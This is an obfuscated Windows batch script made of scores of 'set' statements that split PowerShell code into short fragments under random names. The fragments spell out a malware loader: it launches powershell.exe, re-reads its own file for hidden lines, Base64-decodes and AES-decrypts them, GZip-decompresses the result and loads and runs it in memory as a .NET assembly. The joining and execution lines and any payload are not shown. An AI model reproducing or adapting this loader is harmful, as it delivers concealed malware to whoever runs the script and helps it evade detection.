@echo off
set "AyCbKyOdaw=32"
set "RkuUnLAOFD=xe"
set "thFmVeAAQq=he"
set "NuLNYiYyFi=co"
set "DhUPsPlZNP=1."
set "TfaAHgzZoC=we"
set "FvAeKJLHyM=s\"
set "SLUrqRKfEK=y "
set "bOdWEdlAyO=st"
set "ouPHsxblBD=ll"
set "CBnJZyMTQp= C"
set "mcyLiHkayb=rs"
set "lkdyyppSlE=Po"
set "vPZNokBLcU=0\"
set "GYjXWUZsPS= /"
set "ZpJRFlgbOA=nd"
set "KBwAIlaUls=.e"
set "aeEKniPRwa=:\"
set "iTQFlnIOCm=Wi"
set "NRgnAjWJZC=we"
set "nzGtZckTVG=po"
set "VRGiBDmbmf=do"
set "xljKPfKWXM=in"
set "EqsuspLhXw=rS"
set "FrdgWpOyfh=ll"
set "BUHPpvnXfT=py"
set "wjNNlUSIgj=\v"
set "pizbNtTMpQ=ws"
set "lXGhALOhJl=he"
set "WLnuGDOEgW=em"
set "QXrEqKvMeb=Sy"
set "bDRAfQsEAH=\W"
set "wfHqhwqWBh=ow"
set "izqIoWnZWQ= %~dp0"
set "QYbAcFbbQv=cd"
set "kfZxcMOqWp=rt]:"
set "LyiUQquKzr=[]] "
set "ZKVdGMZnLv=oin "
set "HONKabNigB=gth)"
set "gRHMlEADFE=Ybwh"
set "uXlZqiHzMx=ode]"
set "ZZYFUHfCeU=yste"
set "MTtXdUfxAu= [st"
set "LlwiXdcjVC=('%~f0'"
set "dTjbhyfnor=DRH "
set "QTKNbrHHHD=$WSs"
set "ANOfvdkdxI=-nop"
set "frpYraWfnK=('KY"
set "vFRPPKVYer=$hrw"
set "YodIiHzpOA=Comp"
set "iNTjwkceVI=vj ="
set "uEyMdoCmdN=esaB"
set "PIKOtlNfaT=[Env"
set "eVLoujueHK=PKCS"
set "HeENDlCjjC=, (,"
set "xLPSeYnxYw=.Sec"
set "yuswuhOkaU=m(, "
set "rfKUcrsqXC=sion"
set "IOIOFMwbYH=::De"
set "zpkSVRbreG=ptog"
set "aSqCpqqrbB=Obje"
set "xGHwAmntWX=.Cop"
set "QxAamUNZCO=ne);"
set "upgLkpiPSb=.Mod"
set "JqBTIfMtRc=1..-"
set "XvqwZihqvo=tem."
set "INVejPcuRb=ach "
set "YWlUpJaVim=eam("
set "iiPyhsqUEQ=-1.."
set "jUVrrCgIPF=mOLh"
set "jnuAYzgmKm=Comp"
set "efLaEFBnQy=d;$T"
set "rAaTvkELwj=yB.T"
set "EGgyKjeigB=$Lvh"
set "FcDQAojFUR=$WSs"
set "kkNBDDVyse=1] -"
set "MENVTJrrzi= = N"
set "WvAoRHFVuk=ress"
set "LPnEImrZvu=TuCw"
set "PwTkHVOTTR=onve"
set "inbDICowSE=WSso"
set "PSGCfmLVco=, $W"
set "WOGpmbYAvL=rity"
set "ykODKJQsCo=ay()"
set "zKrGJLPqvn=;$nT"
set "ojhUsPfVAB=g = "
set "gAHNaYdwfJ=yTo("
set "FbwDCtVVAr=File"
set "lCGKYdsIye=::('"
set "POqpWwsjgu=bjec"
set "mrTegcKhRd=h.Pa"
set "PvigGujvsh=rtS4"
set "hLZiJKdYZl=.-16"
set "FZxxTVTxlF=$CAF"
set "ZWqkSZNnOE= '')"
set "QldOSuuuDi= = ["
set "kAArMCqKAX=]::N"
set "ZucelkqKzg=gMod"
set "cbOvGlJpUF=em.I"
set "InwSvGTqyu=)))"
set "rYNJQwPVCW=9tpc"
set "CiHaBwPfRM='')("
set "lrEAPpqhrV=New-"
set "YHoGNbzOqV=vj);"
set "nEeBLPHbwT=Ybwh"
set "xlznWRoJvC=ypto"
set "OecGRLopAE= [Sy"
set "BQLZCCJDBw=P4Ia"
set "fMAqJJGwUk=fore"
set "blPofTETKt=-joi"
set "BpWMBKEXoC=Obje"
set "nlSqYhopvy=;$mm"
set "QoVxsJodpC=[Sys"
set "IMykrDjGQq=pSb."
set "WyjIYdYIIQ=Ybwh"
set "NBTCsQwoZJ=:: '"
set "MtGNoDiVlb=KyB."
set "YUzatAwpmx=  $z"
set "yIfxnwXLQh=V = "
set "DnyMKiqaeV=wh.I"
set "QMHxABihDQ=3); "
set "HsttRzhzal=ss -"
set "vnSHVZvRsy=pres"
set "qGJlExaCEl=[IO."
set "oDXvOykDmx=7;$T"
set "HGDbYRkxiv=)) {"
set "jhOHNYxwcH=iron"
set "oXaumTKbiG=ptor"
set "UFhTBRXMgi='h6b"
set "vGdgxhjaWp==');"
set "bmSXkzsNqf=ON.D"
set "ZTfpZTMTao=]::("
set "mHsbTMZzeS=($uj"
set "DBnuBJYFMR=m.IO"
set "RsWzEdirRy=join"
set "XstwrClJgM=hrwO"
set "wjoXWmqJkX=join"
set "TLNlIxpaht=e = "
set "vYxcDFRuPC=ke($"
set "YejxJGqlak=form"
set "dyyIHkQyFy=lBlo"
set "eETCReUEgz=tion"
set "chmAZFaNwl=m.Re"
set "ULBsnMzmYc== $T"
set "OHOwzMfYMp=tS46"
set "yXqHBovcTE== [S"
set "CbIJhwvvWy=Invo"
set "dNRWZHjypJ=trea"
set "JYGxbXyCOy=]::("
set "TtLmNGYFNV=WSso"
set "aihvFRGVse=BC;$"
set "aoIJUUBpLG=oa ="
set "XRtnwUeAYf=Mode"
set "zmSdwiZbDQ=();$"
set "rstPHgGZqT=();$"
set "wbZLXOasak=ress"
set "EFEslnhZvw=);$T"
set "BYAxpYiSKE=]::C"
set "UWTVwRcjTs=pose"
set "yWfpAQJwwN=rans"
set "FBgsirRSjI=y.Ci"
set "UkprKJOCRJ=ert]"
set "SsiAByuyxW=LvhV"
set "KJkDTgJXQI=saBm"
set "vguiOlcsqE=New-"
set "GUyWUbWOut=[Sys"
set "rilfFzbgwy=urit"
set "eauHVdnpzv=grap"
set "sWNJmkPYMW=$nTp"
set "OqiMRLbBQj=zQR "
set "samnPxoJIU=y]::"
set "OAHNXFLmOX=AFvj"
set "JVFMqNQVSK=);$C"
set "QXKXSxDBqP=[-1."
set "KwGWRauJXA=('da"
set "AsbRQwIIlY= '')"
set "OjVSUegJkP=Sb, "
set "CesoXdvOWT=WSso"
set "gWNgoNGDQw=$NqK"
set "CrLsWLnCeO=ion."
set "TaNbNuDcCO=SoYj"
set "nRtkuJVtrc=oArr"
set "AjSsGQyduW=stem"
set "DXnUfuIvXL=$CAF"
set "SRXfdnByTh=Ybwh"
set "BgxoUHUPKf='gni"
set "blbuCzvlZU=raph"
set "JgrcwrFimx=M) {"
set "OwkkrZTUbJ=);$m"
set "ShCOJFtuRx=stem"
set "iAPfoUaFim=mory"
set "GaCHgNDooQ=16] "
set "zGIfyPfSfA=.Cry"
set "IjJstDtVUp= = $"
set "DDFXQTrVmE=ew-O"
set "yBSzTksyIE=ewLi"
set "IKOtdwvZvi=Stre"
set "ogzmBKNlUb=Ssoa"
set "ulxTVYklVA=.GZi"
set "ggUBEWkAsU=.Cry"
set "oPKyfgzQYE='[-1"
set "uovAtWtAtn=Ssoa"
set "fpnnsCLbRq=comp"
set "IWlrLUMdeW=k; }"
set "LrwhUENkll='[-1"
set "qzxJatrIKa=$CAF"
set "dnTnRhYYHI=and "
set "BPbnUmnZcP=Syst"
set "sgfvCnTCIE=lit("
set "sogCHzZedX=Ybwh"
set "dtfCHComOe=pose"
set "OUwauFxvEH=znSk"
set "YUsoBVYcIm=b = "
set "rUUKlEfaFJ=ment"
set "rkamAdfuGf=oint"
set "yjFDoPrBUf=vj.T"
set "GUCVberCko=gN+y"
set "xHCeGzsPmA=Disp"
set "flLlXtzgCJ= [Sy"
set "HglRiIZNNW=);$h"
